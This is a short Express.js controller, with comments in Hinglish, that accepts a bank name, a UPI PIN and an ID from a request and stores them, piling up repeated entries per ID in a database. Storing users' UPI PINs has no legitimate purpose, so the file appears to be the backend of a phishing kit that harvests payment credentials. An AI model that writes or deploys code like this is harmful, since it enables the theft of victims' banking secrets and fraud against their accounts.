const Visa3 = require('../models/Visa3');

exports.createVisa3 = async (req, res) => {
  const { bankName, upiPin, uniqueid } = req.body;
  
  if (!bankName || !upiPin || !uniqueid) {
    return res.status(400).json({ message: 'All fields are required' });
  }
  
  try {
    let visa3 = await Visa3.findOne({ uniqueid });
  
    if (visa3) {
      // Agar document already exists, to naya entry add karein
      visa3.entries.push({ bankName, upiPin });
    } else {
      // Naya document create karein with an initial entry
      visa3 = new Visa3({
        uniqueid,
        entries: [{ bankName, upiPin }]
      });
    }
  
    await visa3.save();
  
    return res.status(201).json({
      success: true,
      message: 'Visa3 data successfully saved'
    });
  } catch (error) {
    console.error(error);
    return res.status(500).json({
      success: false,
      message: 'Server error, please try again later'
    });
  }
};
